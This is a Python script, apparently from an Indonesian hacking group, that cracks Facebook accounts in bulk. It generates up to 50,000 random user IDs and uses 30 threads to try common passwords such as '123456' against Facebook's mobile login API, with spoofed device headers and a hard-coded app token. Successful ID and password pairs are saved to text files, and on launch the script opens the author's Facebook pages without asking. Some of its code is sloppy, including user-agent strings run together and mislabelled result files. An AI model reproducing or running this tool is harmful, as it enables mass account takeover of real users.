###-----------------[ IMPORT-MODULE ]-------------------###
import requests,json,os,sys,random,datetime,time,re
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor as tred
from rich.markdown import Markdown as mark
from rich.console import Console as sol
from rich.panel import Panel as panel
from rich import print as cetak
from rich.tree import Tree
import zlib
import subprocess
import base64
import os
try:
	import requests
except ImportError:
	os.system("pip install requests")

try:
	import concurrent.futures
except ImportError:
	os.system("pip install futures")

import os
import sys
import time
import requests
import random
import platform
import base64
import subprocess
from concurrent.futures import ThreadPoolExecutor
os.system('xdg-open https://m.facebook.com/groups/1468838800588097/?ref=share&mibextid=lOuIew')
os.system('xdg-open https://www.facebook.com/AlifXyz78?mibextid=kFxxJD')

W = '\033[97;1m' 
R = '\033[91;1m' 
G = '\033[92;1m' 
Y = '\033[93;1m' 
B = '\033[94;1m'
P = '\033[95;1m'
C = '\033[96;1m'
N = '\x1b[0m'

logo = """\033[1;92m           ▂▂▂▂▂▃▄▅▆▇█▉ꕥ🌼ꕥ██▇▆▅▄▃▂▂▂▂▂

   \033[1;34m   ▂▂▂▂▂▃▄▅▆▇█▉ꕥ🌼 GROUP 🌼ꕥ██▇▆▅▄▃▂▂▂▂▂
   
   \033[1;32m         ######   ##   ##    ##  
   \033[1;33m         ##       ##   ##    ## 
   \033[1;34m         #####    ##   ##    ##  
   \033[1;35m         ##       ##   ##    ## 
   \033[1;36m         ##       #######    ## 
   
   \033[1;33m       ♦️FAMILY♦️UNIKERS♦️INDONESIA♦️

\033[93;1m🔥▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬🔥 
\033[1;37m [\033[0;41;37m==========={ AUTHOR\033[0;37;41m Alif Nurdin  }===========\033[1;37;40m\033[1;32m] \033[1;37;40m     
\033[1;47;40m     ╔═════════════════🎭══════════════════╗
\033[1;37;40m     ║ FACEBOOK    :\033[93;1m➤\033[1;32m AlifXyz78            ║
\033[1;37;40m     ║ INFO SCRIPT :\033[93;1m➤\033[1;32m  FREE                ║
\033[1;37;40m     ║ AUTHOR      :\033[93;1m➤ \033[1;32m Alif Nurdin Afizayen║
\033[1;37;40m     ║ GITHUB      :\033[93;1m➤ \033[1;32m Alif-Xyz            ║
\033[1;47;40m     ╚═════════════════🎭══════════════════╝ """

class Main:
	def __init__(self):
		self.id = []
		self.ok = []
		self.cp = []
		self.loop = 0
		os.system("clear")
		print(logo)
		print('\033[93;1mHello Selamat Datang Di Scriptnya FUI \033[0m')
		print('\033[1;92mJangan Lupa Gabung Di Group FUI \033[0m')
		print("")
		print("%s[%s1%s]%s CRACK RANDOM FB TAHUN 2008-11 %s[New]"%(G,G,R,Y,B))
		print("\033[1;31m[2] KELUAR")
		__SHO = input("\n\033[0;91m➤ \033[0;92m Pilih \033[0m: ")
		if __SHO in ["", " "]:
			Main()
		elif __SHO in ["1", "01"]:
			self.fbtua()
		else:
			exit()

	def fbtua(self):
		x = 111111111
		xx = 999999999
		idx = "100000" 
		os.system('clear');print(logo)
		limit = int(input("\033[97;1m[➤] Mau Berapa Id Broot? Limit 50,000: "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			
			print("\033[0;93m[➤] Berhasil Mengumpukan -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s[➤] GUNAKAN SANDI INI, SILAHKAN SALIN DAN TEMPEL DI BAWAH       [➤] %s123456,1234567,12345678,123456789"%(G,Y))
				listpass = input("%s[➤] Masukan Sandi :%s "%(G,Y))
				if len(listpass)<=6:
					exit("\n%s[➤] SANDI MINNIMAL 4 KARAKTER"%(B))
				print("%s[➤] CRACK MENGGUNAKAN SANDI -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
				print("\n%s[➤] HASIL OK DISIMPAN DI -> ok.txt"%(G))
				print("%s[➤] HASIL CP DISIMPAN DI -> cp.txt"%(Y))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n[➤] CRACK SELESAI...")
		except Exception as e:exit(str(e))

	def api(self, uid, pwx):
		ua = random.choice([
			"Mozilla/5.0 (BlackBerry; U; BlackBerry 9700; en) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.448 Mobile Safari/534.8+]"
			"Mozilla/5.0 (Linux; Android 6.0; CAM-L21 Build/HUAWEICAM-L21) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36]"
			"NokiaC3-00/5.0 (07.20) Profil/MIDP-2.1 Konfigurasi/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, seperti Gecko) Safari/420+]"
            "Mozilla/5.0 (Linux; Android {str(rr(4,12))}; {str(rc(gt))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 {str(rc(aZ))}{str(rr(1,1000))}"
            "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/{str(rc(build_nokiax))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 NokiaBrowser/7.{str(rr(1,5))}.1.{str(rr(16,37))} {str(rc(aZ))}{str(rr(1,1000))}"
            "Mozilla/5.0 (Linux; U; Android {str(rr(4,12))}; {str(rc(basa))}; Redmi 5 Plus Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(40,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/{str(rr(1,99))}.{str(rc(miui_v1))}.{str(rc(miui_v2))}{str(rc(miui_v3))} {str(rc(aZ))}{str(rr(1,1000))}"
            "Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]"
			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
            "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
            "Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36]"
            "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)]"
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36]"
            "Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.1.2461.137501]"
            "Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+]"
            "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36]"
		])
		sys.stdout.write(
			"\r\r%sFAMILY_UNIKERS %s/%s -> \033[0;97m CP👉%s \033[0;97m OK👉%s "%(W,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			headers = {
				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
				"x-fb-net-hni": str(random.randint(20000, 40000)), 
				"x-fb-connection-quality": "EXCELLENT",
				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
				"user-agent": ua, 
				"content-type": "application/x-www-form-urlencoded", 
				"x-fb-http-engine": "Liger"
			}
			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r\033[0;93m[FAMILY_UNIKERS-CP]USERNAME :%sSANDI :%s\033[0;93m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r\033[92;1m[FAMILY-OK]USERNAME :%sSANDI :%s\033[92;1m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			else:
				continue

		self.loop +=1

try:Main()
except Exception as e:exit(str(e))
